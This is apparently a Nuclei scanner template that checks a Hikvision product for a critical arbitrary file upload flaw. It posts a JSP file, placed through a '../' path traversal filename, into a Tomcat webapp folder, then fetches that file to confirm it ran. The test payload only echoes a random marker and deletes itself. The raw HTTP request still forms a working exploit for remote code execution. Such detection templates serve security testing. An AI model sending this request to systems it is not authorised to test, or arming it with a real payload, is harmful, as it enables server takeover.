id: hikvision-js-files-upload

info:
  name: hikvision-js-files-upload
  author: hikvision-js-files-upload
  severity: critical

variables:
  filename: '{{rand_base(6)}}'
  payload: '{{rand_base(6)}}'
  boundary: '{{rand_base(6)}}'

http:
  - raw:
      - |
        POST /center/api/files;.js HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----{{boundary}}
        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36

        ------{{boundary}}
        Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}.jsp"
        Content-Type:image/jpeg

        <%out.println("{{payload}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------{{boundary}}--
      - |
        GET /clusterMgr/{{filename}}.jsp;.js HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "{{payload}}")'
        condition: and

